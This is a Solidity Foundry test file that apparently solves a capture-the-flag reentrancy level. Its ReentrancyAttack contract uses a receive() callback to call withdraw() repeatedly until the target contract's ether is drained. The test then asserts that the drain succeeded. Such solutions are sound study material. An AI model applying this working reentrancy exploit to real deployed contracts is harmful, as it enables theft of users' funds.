// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/10_Reentrance.sol";

contract ReentrancyAttack {
    Reentrance _reentrance;
    constructor(address payable _reentranceAddress){
        _reentrance = Reentrance(_reentranceAddress);
    }

    function attack() public {
        _reentrance.withdraw(1 ether);
    }

    receive() payable external{
        if(address(_reentrance).balance > 0) _reentrance.withdraw(1 ether); // Assumes all balances are in units of 1 ether, for simplicity
    }
}

contract ReentranceTest is Test {
    Reentrance _reentrance;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        vm.deal(deployer, 1 ether); // Fund deployer
        vm.deal(attacker, 1 ether); // Fund Attacker

        _reentrance = new Reentrance();
        
        address(_reentrance).call{value: 1 ether}("");
    }

    function testSolution() public {
        vm.startPrank(attacker);

        ReentrancyAttack _reentrancyAttack = new ReentrancyAttack(payable(address(_reentrance)));
        _reentrance.donate{value:1 ether}(address(_reentrancyAttack));

        _reentrancyAttack.attack();

        assertTrue(address(_reentrance).balance == 0, "Contract instance still has funds!");
    }
}
